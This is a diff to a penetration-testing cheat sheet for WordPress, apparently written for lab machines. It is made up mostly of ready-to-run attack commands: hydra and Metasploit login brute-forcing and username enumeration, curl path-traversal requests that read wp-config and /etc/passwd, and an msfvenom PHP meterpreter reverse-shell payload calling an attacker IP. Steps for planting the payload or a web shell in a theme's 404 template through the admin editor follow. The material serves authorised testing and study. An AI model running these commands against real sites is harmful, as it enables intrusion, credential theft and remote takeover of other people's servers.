@@ -1,4 +1,5 @@
 # Pentest Wordpress websites
+# Reference: https://www.hackingarticles.in/wordpress-reverse-shell/
 
 A suggested wordlist for bruteforce is fasttrack.txt but with season/years updated
 to current year + possibly custom words depending on the scenario
@@ -22,6 +23,17 @@ docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate ap
 ;; Once we find a plugin we generally find notes about the plugin 
 ;; in the directory found within the readme.txt file
 
+# Username Enumeration from wp-admin (hydra)
+hydra -L fsocity.dic -p test $TARGETIP http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
+
+# Username Enumeration from wp-admin (hydra)
+;; we may need to `set WPCHECK false` if it does not recognize the website as wordpress
+> use scanner/http/wordpress_login_enum
+> set RHOSTS $TARGETIP
+> set USER_FILE /path/to/users.txt
+> set PASSWORD "test"
+> run
+
 # Test for CVE-2015-1579/CVE-2014-9734 
 # Reference: https://www.exploit-db.com/exploits/36554
 ;; Wordpress Slider Revolution Responsive <= 4.1.4 suffers from Arbitrary File Download vulnerability
@@ -30,6 +42,7 @@ curl "http://localhost/wp-admin/admin-ajax.php?action=revslider_show_image&img=.
 curl "http://localhost/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../etc/passwd"
 
 # Bruteforce credentials through xmlrpc (metasploit)
+;; we may need to `set WPCHECK false` if it does not recognize the website as wordpress
 > use auxiliary/scanner/http/wordpress_xmlrpc_login
 > set USER_FILE /home/giuseppe/users.txt
 > set USER_AS_PASS true
@@ -38,19 +51,54 @@ curl "http://localhost/wp-admin/admin-ajax.php?action=revslider_show_image&img=.
 > set threads 100
 > show options
 
-# Upload a shell (must have administrative rights)
+# Upload a shell through plugins (must have wp administrative rights)
+;; we may need to `set WPCHECK false` if it does not recognize the website as wordpress
 ;; first try to login with the credentials found
 ;; check that we have administrative rights.
-use unix/webapp/wp_admin_shell_upload
-set USERNAME usass
-set PASSWORD password123
-set RHOSTS example.com
-run
+> use unix/webapp/wp_admin_shell_upload
+> set USERNAME usass
+> set PASSWORD password123
+> set RHOSTS example.com
+> run
 
-# RCE from Admin Panel
+# Upload a shell through themes (must have wp administrative rights)
+We first have to generate the desired PHP payload can be generated for
+example through:
+
+    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.19.217 LPORT=5555 -f raw > shell.php
+
+Open a multi handler with the same payload matched by doing from an msf console:
+> use multi/handler
+> set PAYLOAD php/meterpreter_reverse_tcp
+> set LHOST=tun0
+> set LPORT=5555
+> set ExitOnSession false
+> run -j 
+
+Then go from an admin wordpress dashboard to:
+Appearance -> Themes -> Editor
+
+Here, edit the 404 template of a plugin and put inside the generated payload,
+for example it can be a php meterpreter reverse TCP or just a reverse
+TCP shell.
+
+Then paste your payload in the apposite page, then we can
+reach the target page to run the payload, generally if we have
+chosen the 404 page, it may be located here: 
+
+    http://$TARGETIP/wordpress/wp-content/themes/<themename>/404.php
+
+for example with the twentyfifteen theme (a common theme):
+
+    http://$TARGETIP/wordpress/wp-content/themes/twentyfifteen/404.php
+
+Once we land on this page we should get the reverse shell.
+
+# Upload a shell through themes (must have wp administrative rights) (short explanation)
 Modifying a php from the theme used (admin credentials needed)
 
 Appearance -> Editor -> 404 Template (at the right)
 Change the content for a php shell
 https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
 http://<IP>/wp-content/themes/twentytwelve/404.php
+
